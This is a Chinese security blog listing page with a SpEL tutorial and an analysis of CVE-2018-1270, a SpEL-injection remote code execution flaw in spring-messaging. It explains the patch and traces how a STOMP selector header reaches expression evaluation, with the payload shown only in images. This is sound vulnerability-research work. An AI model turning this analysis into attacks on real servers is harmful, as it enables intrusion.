<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="网络安全,黑客,JAVA安全,代码审计,渗透测试,入侵,SRC,扫描,WEB安全,移动安全,PHP">
    <meta name="description" content="蓝骨, langu.xyz">
    <meta name="author" content="langu_xyz">
    
        <title>
            
                        langu_xyz
        </title>
        
<link rel="stylesheet" href="/css/style.css">

            <link rel="shortcut icon" href="/images/logo.jpeg">
                
<link rel="stylesheet" href="/css/font-awesome.min.css">

                    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"blog.langu.xyz","root":"/","language":"zh","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/logo.jpeg","favicon":"/images/logo.jpeg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/shamo.jpg","description":"XYZ(无限未来)"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.3"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
  </script>

                    <script>
                        var _hmt = _hmt || [];
                        (function() {
                          var hm = document.createElement("script");
                          hm.src = "https://hm.baidu.com/hm.js?1cd6e64ff252acf24b707985fcec8850";
                          var s = document.getElementsByTagName("script")[0]; 
                          s.parentNode.insertBefore(hm, s);
                        })();
                        </script>
                        
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="langu_xyz" type="application/atom+xml">
</head>
<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <span class="pjax-progress-icon">
            <i class="fas fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                    <a class="logo-title" href="/">
                        langu_xyz
                    </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class="active" href="/" >
                                HOME
                            </a>
                        </li>
                        
                        <li class="menu-item">
                            <a class="" href="/tags/THINK/" >
                                THINK
                            </a>
                        </li>
                        
                            
                                <li class="menu-item search search-popup-trigger">
                                    <i class="fas fa-search"></i>
                                </li>
                                
                                
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                    
                        <div class="icon-item menu-bar">
                            <div class="menu-bar-middle"></div>
                        </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class="active" href="/" >
                        HOME
                    </a>
                </li>
                
                <li class="drawer-menu-item flex-center">
                    <a class="" href="/tags/THINK/" >
                        THINK
                    </a>
                </li>
                
        </ul>
    </div>

    <div class="window-mask"></div>

</header>
        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="home-content-container fade-in-down-animation">
    <ul class="home-article-list">
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/Spring%20Expression%20Language%EF%BC%88SpEL%EF%BC%89/">
                        Spring Expression Language（SpEL）
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        0x00 简介SpEL（Spring Expression Language）是Spring提供的一种表达式语言
能在运行时构建复杂表达式、存取对象图属性、对象方法调用等，并且能与Spring功能完美整合，如能用来配置Bean定义
表达式语言给静态Java语言增加了动态功能
0x01 表达式执行步骤SpEL求表达式值时的步骤
1、构造一个解析器
    SpEL使用ExpressionParser接口表示解析器，提供SpelExpressionParser默认实现
2、解析器解析字符串表达式
    使用ExpressionParser的parseExpression来解析相应的表达式为Expression对象
3、构造上下文
    准备比如变量定义等等表达式需要的上下文数据
4、根据上下文得到表达式运算后的值
    通过Expression接口的getValue方法根据上下文获得表达式值

1234567891011ExpressionParser parser = new SpelExpressionParser(); （1）Expression exp = parser.parseExpression(&quot;&#x27;Hello World&#x27;&quot;); （2）String message = (String) exp.getValue(); （4）ExpressionParser parser = new SpelExpressionParser();    (1)Expression expression = parser.parseExpression(&quot;(&#x27;Hello&#x27; + &#x27; World&#x27;).concat(#end)&quot;);   (2) EvaluationContext context = new StandardEvaluationContext();    (3)context.setVariable(&quot;end&quot;, &quot;!&quot;);    Assert.assertEquals(&quot;Hello World!&quot;, expression.getValue(context));   (4) 

0x02 工作原理
0x03 主要接口EvaluationContext表示上下文环境默认实现是org.springframework.expression.spel.support包中的StandardEvaluationContext类使用setRootObject方法来设置根对象，使用setVariable方法来注册自定义变量，使用registerFunction来注册自定义函数等
下例表达式name表示对应EvaluationContext的rootObject的一个属性
1234567891011public void EvaluationContextTest() &#123;	Object user = new Object() &#123;		public String getName() &#123;			return &quot;abc&quot;;		&#125;	&#125;;	EvaluationContext context = new StandardEvaluationContext(user);	ExpressionParser parser = new SpelExpressionParser();	Assert.assertTrue(parser.parseExpression(&quot;name&quot;).getValue(context, String.class).equals(&quot;abc&quot;));	Assert.assertTrue(parser.parseExpression(&quot;getName()&quot;).getValue(context, String.class).equals(&quot;abc&quot;));&#125;

ExpressionParser表示解析器默认实现是org.springframework.expression.spel.standard包中的SpelExpressionParser类，使用parseExpression方法将字符串表达式转换为Expression对象对于ParserContext接口用于定义字符串表达式是不是模板，及模板开始与结束字符
1234567891011121314151617181920212223242526public interface ExpressionParser &#123;        Expression parseExpression(String expressionString);        Expression parseExpression(String expressionString, ParserContext context);    &#125;  public void testParserContext() &#123;        ExpressionParser parser = new SpelExpressionParser();        ParserContext parserContext = new ParserContext() &#123;            @Override             public boolean isTemplate() &#123;                return true;            &#125;            @Override            public String getExpressionPrefix() &#123;                return &quot;#&#123;&quot;;            &#125;            @Override            public String getExpressionSuffix() &#123;                return &quot;&#125;&quot;;            &#125;        &#125;;        String template = &quot;#&#123;&#x27;Hello &#x27;&#125;#&#123;&#x27;World!&#x27;&#125;&quot;;        Expression expression = parser.parseExpression(template, parserContext);        Assert.assertEquals(&quot;Hello World!&quot;, expression.getValue());    &#125;  

Expression表示表达式对象默认实现是org.springframework.expression.spel.standard包中的SpelExpression提供getValue方法用于获取表达式值，提供setValue方法用于设置对象值
12345ExpressionParser parser = new SpelExpressionParser();    (1)Expression expression = parser.parseExpression(&quot;(&#x27;Hello&#x27; + &#x27; World&#x27;).concat(#end)&quot;);   (2) EvaluationContext context = new StandardEvaluationContext();    (3)context.setVariable(&quot;end&quot;, &quot;!&quot;);    Assert.assertEquals(&quot;Hello World!&quot;, expression.getValue(context));   (4) 

0x04 主要功能1234567891011121314151617181920212223242526272829303132333435Literal expressionsBoolean and relational operatorsRegular expressionsClass expressionsAccessing properties, arrays, lists, mapsMethod invocationRelational operatorsAssignmentCalling constructorsBean referencesArray constructionInline listsTernary operatorVariablesUser defined functionsCollection projectionCollection selectionTemplated expressions

参考：https://docs.spring.io/spring/docs/3.0.x/reference/expressions.htmlhttps://blog.csdn.net/zhoudaxia/article/details/38174169https://github.com/elim168/elim168.github.io/blob/master/spring/bean/23.spel%E8%A1%A8%E8%BE%BE%E5%BC%8F.md

                    
                </div> -->
                <div class="article-content markdown-body">
                    <h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p><code>SpEL（Spring Expression Language）是Spring提供的一种表达式语言</code></p>
<p><code>能在运行时构建复杂表达式、存取对象图属性、对象方法调用等，并且能与Spring功能完美整合，如能用来配置Bean定义</code></p>
<p><code>表达式语言给静态Java语言增加了动态功能</code></p>
<h3 id="0x01-表达式执行步骤"><a href="#0x01-表达式执行步骤" class="headerlink" title="0x01 表达式执行步骤"></a>0x01 表达式执行步骤</h3><p>SpEL求表达式值时的步骤</p>
<pre><code>1、构造一个解析器
    SpEL使用ExpressionParser接口表示解析器，提供SpelExpressionParser默认实现
2、解析器解析字符串表达式
    使用ExpressionParser的parseExpression来解析相应的表达式为Expression对象
3、构造上下文
    准备比如变量定义等等表达式需要的上下文数据
4、根据上下文得到表达式运算后的值
    通过Expression接口的getValue方法根据上下文获得表达式值
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser(); （1）</span><br><span class="line">Expression exp = parser.parseExpression(&quot;&#x27;Hello World&#x27;&quot;); （2）</span><br><span class="line">String message = (String) exp.getValue(); （4）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ExpressionParser parser = new SpelExpressionParser();    (1)</span><br><span class="line">Expression expression = parser.parseExpression(&quot;(&#x27;Hello&#x27; + &#x27; World&#x27;).concat(#end)&quot;);   (2) </span><br><span class="line">EvaluationContext context = new StandardEvaluationContext();    (3)</span><br><span class="line">context.setVariable(&quot;end&quot;, &quot;!&quot;);    </span><br><span class="line">Assert.assertEquals(&quot;Hello World!&quot;, expression.getValue(context));   (4) </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="0x02-工作原理"><a href="#0x02-工作原理" class="headerlink" title="0x02 工作原理"></a>0x02 工作原理</h3><p><img lazyload src="/images/loading.svg" data-src="15238470717386.jpg"></p>
<h3 id="0x03-主要接口"><a href="#0x03-主要接口" class="headerlink" title="0x03 主要接口"></a>0x03 主要接口</h3><h4 id="EvaluationContext"><a href="#EvaluationContext" class="headerlink" title="EvaluationContext"></a>EvaluationContext</h4><p>表示上下文环境<br>默认实现是org.springframework.expression.spel.support包中的StandardEvaluationContext类<br>使用setRootObject方法来设置根对象，使用setVariable方法来注册自定义变量，使用registerFunction来注册自定义函数等</p>
<p>下例表达式name表示对应EvaluationContext的rootObject的一个属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public void EvaluationContextTest() &#123;</span><br><span class="line">	Object user = new Object() &#123;</span><br><span class="line">		public String getName() &#123;</span><br><span class="line">			return &quot;abc&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">	EvaluationContext context = new StandardEvaluationContext(user);</span><br><span class="line">	ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">	Assert.assertTrue(parser.parseExpression(&quot;name&quot;).getValue(context, String.class).equals(&quot;abc&quot;));</span><br><span class="line">	Assert.assertTrue(parser.parseExpression(&quot;getName()&quot;).getValue(context, String.class).equals(&quot;abc&quot;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ExpressionParser"><a href="#ExpressionParser" class="headerlink" title="ExpressionParser"></a>ExpressionParser</h4><p>表示解析器<br>默认实现是org.springframework.expression.spel.standard包中的SpelExpressionParser类，使用parseExpression方法将字符串表达式转换为Expression对象<br>对于ParserContext接口用于定义字符串表达式是不是模板，及模板开始与结束字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public interface ExpressionParser &#123;    </span><br><span class="line">    Expression parseExpression(String expressionString);    </span><br><span class="line">    Expression parseExpression(String expressionString, ParserContext context);    </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public void testParserContext() &#123;    </span><br><span class="line">    ExpressionParser parser = new SpelExpressionParser();    </span><br><span class="line">    ParserContext parserContext = new ParserContext() &#123;    </span><br><span class="line">        @Override    </span><br><span class="line">         public boolean isTemplate() &#123;    </span><br><span class="line">            return true;    </span><br><span class="line">        &#125;    </span><br><span class="line">        @Override    </span><br><span class="line">        public String getExpressionPrefix() &#123;    </span><br><span class="line">            return &quot;#&#123;&quot;;    </span><br><span class="line">        &#125;    </span><br><span class="line">        @Override    </span><br><span class="line">        public String getExpressionSuffix() &#123;    </span><br><span class="line">            return &quot;&#125;&quot;;    </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;;    </span><br><span class="line">    String template = &quot;#&#123;&#x27;Hello &#x27;&#125;#&#123;&#x27;World!&#x27;&#125;&quot;;    </span><br><span class="line">    Expression expression = parser.parseExpression(template, parserContext);    </span><br><span class="line">    Assert.assertEquals(&quot;Hello World!&quot;, expression.getValue());    </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<h4 id="Expression"><a href="#Expression" class="headerlink" title="Expression"></a>Expression</h4><p>表示表达式对象<br>默认实现是org.springframework.expression.spel.standard包中的SpelExpression<br>提供getValue方法用于获取表达式值，提供setValue方法用于设置对象值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();    (1)</span><br><span class="line">Expression expression = parser.parseExpression(&quot;(&#x27;Hello&#x27; + &#x27; World&#x27;).concat(#end)&quot;);   (2) </span><br><span class="line">EvaluationContext context = new StandardEvaluationContext();    (3)</span><br><span class="line">context.setVariable(&quot;end&quot;, &quot;!&quot;);    </span><br><span class="line">Assert.assertEquals(&quot;Hello World!&quot;, expression.getValue(context));   (4) </span><br></pre></td></tr></table></figure>

<h3 id="0x04-主要功能"><a href="#0x04-主要功能" class="headerlink" title="0x04 主要功能"></a>0x04 主要功能</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Literal expressions</span><br><span class="line"></span><br><span class="line">Boolean and relational operators</span><br><span class="line"></span><br><span class="line">Regular expressions</span><br><span class="line"></span><br><span class="line">Class expressions</span><br><span class="line"></span><br><span class="line">Accessing properties, arrays, lists, maps</span><br><span class="line"></span><br><span class="line">Method invocation</span><br><span class="line"></span><br><span class="line">Relational operators</span><br><span class="line"></span><br><span class="line">Assignment</span><br><span class="line"></span><br><span class="line">Calling constructors</span><br><span class="line"></span><br><span class="line">Bean references</span><br><span class="line"></span><br><span class="line">Array construction</span><br><span class="line"></span><br><span class="line">Inline lists</span><br><span class="line"></span><br><span class="line">Ternary operator</span><br><span class="line"></span><br><span class="line">Variables</span><br><span class="line"></span><br><span class="line">User defined functions</span><br><span class="line"></span><br><span class="line">Collection projection</span><br><span class="line"></span><br><span class="line">Collection selection</span><br><span class="line"></span><br><span class="line">Templated expressions</span><br></pre></td></tr></table></figure>

<p>参考：<br><a class="link" target="_blank" rel="noopener" href="https://docs.spring.io/spring/docs/3.0.x/reference/expressions.html">https://docs.spring.io/spring/docs/3.0.x/reference/expressions.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/zhoudaxia/article/details/38174169">https://blog.csdn.net/zhoudaxia/article/details/38174169<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://github.com/elim168/elim168.github.io/blob/master/spring/bean/23.spel%E8%A1%A8%E8%BE%BE%E5%BC%8F.md">https://github.com/elim168/elim168.github.io/blob/master/spring/bean/23.spel%E8%A1%A8%E8%BE%BE%E5%BC%8F.md<i class="fas fa-external-link-alt"></i></a></p>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Tue Apr 10 2018 21:00:00 GMT+0800">2018-04-10</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/JAVA/">JAVA</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/Spring%20Expression%20Language%EF%BC%88SpEL%EF%BC%89/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/CVE-2018-1270%20Remote%20Code%20Execution%20with%20spring-messaging/">
                        CVE-2018-1270 Remote Code Execution with spring-messaging
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        

CVE-2018-1270 




STOMP协议STOMP是一个简单的可互操作的协议, 被用于通过中间服务器在客户端之间进行异步消息传递。它定义了一种在客户端与服务端进行消息传递的文本格式.
STOMP协议与HTTP协议很相似，它基于TCP协议，使用了以下命令：
12345678910CONNECTSENDSUBSCRIBEUNSUBSCRIBEBEGINCOMMITABORTACKNACKDISCONNECT

STOMP的客户端和服务器之间的通信是通过“帧”（Frame）实现的，每个帧由多“行”（Line）组成。
第一行包含了命令，然后紧跟键值对形式的Header内容。
第二行必须是空行。
第三行开始就是Body内容，末尾都以空字符结尾。

STOMP的客户端和服务器之间的通信是通过MESSAGE帧、RECEIPT帧或ERROR帧实现的，它们的格式相似。
客户端可以使用SEND命令来发送消息以及描述消息的内容，用SUBSCRIBE命令来订阅消息以及由谁来接收消息。这样就可以建立一个发布订阅系统，消息可以从客户端发送到服务器进行操作，服务器也可以推送消息到客户端。
connect接受一个可选的headers参数用来标识附加的头部，默认情况下，如果没有在headers额外添加，这个库会默认构建一个独一无二的ID。用户定义的headers通常用于允许使用者在进行订阅帧中的selector来过滤基于应用程序定义的headers消息。
分析补丁https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a

把StandardEvaluationContext换成了SimpleEvaluationContext

使用了expression.getValue()猜测可能是SpEL表达式注入  
删除了StandardEvaluationContext引用，采用了SimpleEvaluationContext,StandardEvaluationContext可以执行任意SpEL表达式，Spring官方在5.0.5之后换用SimpleEvaluationContext，用于实现简单的数据绑定，保持灵活性减少安全隐患
https://github.com/spring-projects/spring-framework/blob/v5.0.5.RELEASE/spring-expression/src/main/java/org/springframework/expression/spel/support/StandardEvaluationContext.java
https://github.com/spring-projects/spring-framework/blob/v5.0.5.RELEASE/spring-expression/src/main/java/org/springframework/expression/spel/support/SimpleEvaluationContext.java
漏洞分析在expression.getValue()处设置断点

跳入继续可以看到命令被表达式处理后执行

然后再从expression.getValue()向上查看调用链
&lt;—- filterSubscriptions(result, message) &lt;—-return findSubscriptionsInternal(destination, message);(findSubscriptions) &lt;—- this.subscriptionRegistry.findSubscriptions(message);(sendMessageToSubscribers)
上游是sendMessageToSubscribers函数，send操作调用了getValue
在this.subscriptionRegistry.findSubscriptions处设置断点，然后继续调试

两层for循环把allMatches里的数据提取出来

然后sub.getSelectorExpression取出Selector里的数据

接着expression中的命令就被getValue触发执行了

截止到这里，完成了从发送到执行的过程但是header是在connect阶段定义的
先通过app.js添加header并构造执行语句

在handleMessageInternal对消息进行处，跟踪header到了registerSubscription

1addSubscriptionInternal(sessionId, subscriptionId, destination, message);

继续往下跟又回到了messaging/simp/broker/DefaultSubscriptionRegistry.java

可以看到header中的数据已经被赋予给selector

此时的sessionId和subsId如下图，到此connect过程就完成了，当send message的时候，就会根据sessionId和subsId来获取selector

下图就是send message操作，sessionId和subsId与上图一致

模块代码略读略http://www.cnblogs.com/davidwang456/p/4446796.html
修复方案1235.0.x users should upgrade to 5.0.54.3.x users should upgrade to 4.3.16Older versions should upgrade to a supported branch

参考：https://pivotal.io/security/cve-2018-1270https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37ahttp://blog.nsfocus.net/spring-messaging-analysis/https://xz.aliyun.com/t/2252http://www.cnblogs.com/davidwang456/p/4446796.htmlhttps://segmentfault.com/a/1190000006617344https://cert.360.cn/warning/detail?id=3efa573a1116c8e6eed3b47f78723f12

                    
                </div> -->
                <div class="article-content markdown-body">
                    <blockquote>
<blockquote>
<p>CVE-2018-1270 </p>
</blockquote>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="cve-2018-1270.gif" alt="cve-2018-1270"></p>
<p><img lazyload src="/images/loading.svg" data-src="15239574739980.jpg"></p>
<h3 id="STOMP协议"><a href="#STOMP协议" class="headerlink" title="STOMP协议"></a>STOMP协议</h3><p>STOMP是一个简单的可互操作的协议, 被用于通过中间服务器在客户端之间进行异步消息传递。它定义了一种在客户端与服务端进行消息传递的文本格式.</p>
<p>STOMP协议与HTTP协议很相似，它基于TCP协议，使用了以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CONNECT</span><br><span class="line">SEND</span><br><span class="line">SUBSCRIBE</span><br><span class="line">UNSUBSCRIBE</span><br><span class="line">BEGIN</span><br><span class="line">COMMIT</span><br><span class="line">ABORT</span><br><span class="line">ACK</span><br><span class="line">NACK</span><br><span class="line">DISCONNECT</span><br></pre></td></tr></table></figure>

<p>STOMP的客户端和服务器之间的通信是通过“帧”（Frame）实现的，每个帧由多“行”（Line）组成。</p>
<pre><code>第一行包含了命令，然后紧跟键值对形式的Header内容。
第二行必须是空行。
第三行开始就是Body内容，末尾都以空字符结尾。
</code></pre>
<p>STOMP的客户端和服务器之间的通信是通过MESSAGE帧、RECEIPT帧或ERROR帧实现的，它们的格式相似。</p>
<p>客户端可以使用SEND命令来发送消息以及描述消息的内容，用SUBSCRIBE命令来订阅消息以及由谁来接收消息。这样就可以建立一个发布订阅系统，消息可以从客户端发送到服务器进行操作，服务器也可以推送消息到客户端。</p>
<p>connect接受一个可选的headers参数用来标识附加的头部，默认情况下，如果没有在headers额外添加，这个库会默认构建一个独一无二的ID。用户定义的headers通常用于允许使用者在进行订阅帧中的selector来过滤基于应用程序定义的headers消息。</p>
<h3 id="分析补丁"><a href="#分析补丁" class="headerlink" title="分析补丁"></a>分析补丁</h3><p><a class="link" target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a">https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a<i class="fas fa-external-link-alt"></i></a></p>
<p><img lazyload src="/images/loading.svg" data-src="15239462010523.jpg"></p>
<p>把StandardEvaluationContext换成了SimpleEvaluationContext</p>
<p><img lazyload src="/images/loading.svg" data-src="15239467520185.jpg"></p>
<p>使用了expression.getValue()猜测可能是SpEL表达式注入  </p>
<p>删除了StandardEvaluationContext引用，采用了SimpleEvaluationContext,StandardEvaluationContext可以执行任意SpEL表达式，Spring官方在5.0.5之后换用SimpleEvaluationContext，用于实现简单的数据绑定，保持灵活性减少安全隐患</p>
<p><a class="link" target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-framework/blob/v5.0.5.RELEASE/spring-expression/src/main/java/org/springframework/expression/spel/support/StandardEvaluationContext.java">https://github.com/spring-projects/spring-framework/blob/v5.0.5.RELEASE/spring-expression/src/main/java/org/springframework/expression/spel/support/StandardEvaluationContext.java<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-framework/blob/v5.0.5.RELEASE/spring-expression/src/main/java/org/springframework/expression/spel/support/SimpleEvaluationContext.java">https://github.com/spring-projects/spring-framework/blob/v5.0.5.RELEASE/spring-expression/src/main/java/org/springframework/expression/spel/support/SimpleEvaluationContext.java<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在expression.getValue()处设置断点</p>
<p><img lazyload src="/images/loading.svg" data-src="15239471855383.jpg"></p>
<p>跳入继续可以看到命令被表达式处理后执行</p>
<p><img lazyload src="/images/loading.svg" data-src="15239473224816.jpg"></p>
<p>然后再从expression.getValue()向上查看调用链</p>
<p>&lt;—- filterSubscriptions(result, message) &lt;—-return findSubscriptionsInternal(destination, message);(findSubscriptions) &lt;—- this.subscriptionRegistry.findSubscriptions(message);(sendMessageToSubscribers)</p>
<p>上游是sendMessageToSubscribers函数，send操作调用了getValue</p>
<p>在this.subscriptionRegistry.findSubscriptions处设置断点，然后继续调试</p>
<p><img lazyload src="/images/loading.svg" data-src="15239492017650.jpg"></p>
<p>两层for循环把allMatches里的数据提取出来</p>
<p><img lazyload src="/images/loading.svg" data-src="15239499162060.jpg"></p>
<p>然后sub.getSelectorExpression取出Selector里的数据</p>
<p><img lazyload src="/images/loading.svg" data-src="15239494692128.jpg"></p>
<p>接着expression中的命令就被getValue触发执行了</p>
<p><img lazyload src="/images/loading.svg" data-src="15239499706498.jpg"></p>
<p>截止到这里，完成了从发送到执行的过程<br>但是header是在connect阶段定义的</p>
<p>先通过app.js添加header并构造执行语句</p>
<p><img lazyload src="/images/loading.svg" data-src="15239560312364.jpg"></p>
<p>在handleMessageInternal对消息进行处，跟踪header到了registerSubscription</p>
<p><img lazyload src="/images/loading.svg" data-src="15239565293668.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addSubscriptionInternal(sessionId, subscriptionId, destination, message);</span><br></pre></td></tr></table></figure>

<p>继续往下跟又回到了messaging/simp/broker/DefaultSubscriptionRegistry.java</p>
<p><img lazyload src="/images/loading.svg" data-src="15239566422489.jpg"></p>
<p>可以看到header中的数据已经被赋予给selector</p>
<p><img lazyload src="/images/loading.svg" data-src="15239567899899.jpg"></p>
<p>此时的sessionId和subsId如下图，到此connect过程就完成了，当send message的时候，就会根据sessionId和subsId来获取selector</p>
<p><img lazyload src="/images/loading.svg" data-src="15239570915820.jpg"></p>
<p>下图就是send message操作，sessionId和subsId与上图一致</p>
<p><img lazyload src="/images/loading.svg" data-src="15239572472919.jpg"></p>
<h3 id="模块代码略读"><a href="#模块代码略读" class="headerlink" title="模块代码略读"></a>模块代码略读</h3><p>略<br><a class="link" target="_blank" rel="noopener" href="http://www.cnblogs.com/davidwang456/p/4446796.html">http://www.cnblogs.com/davidwang456/p/4446796.html<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5.0.x users should upgrade to 5.0.5</span><br><span class="line">4.3.x users should upgrade to 4.3.16</span><br><span class="line">Older versions should upgrade to a supported branch</span><br></pre></td></tr></table></figure>

<p>参考：<br><a class="link" target="_blank" rel="noopener" href="https://pivotal.io/security/cve-2018-1270">https://pivotal.io/security/cve-2018-1270<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a">https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="http://blog.nsfocus.net/spring-messaging-analysis/">http://blog.nsfocus.net/spring-messaging-analysis/<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2252">https://xz.aliyun.com/t/2252<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" 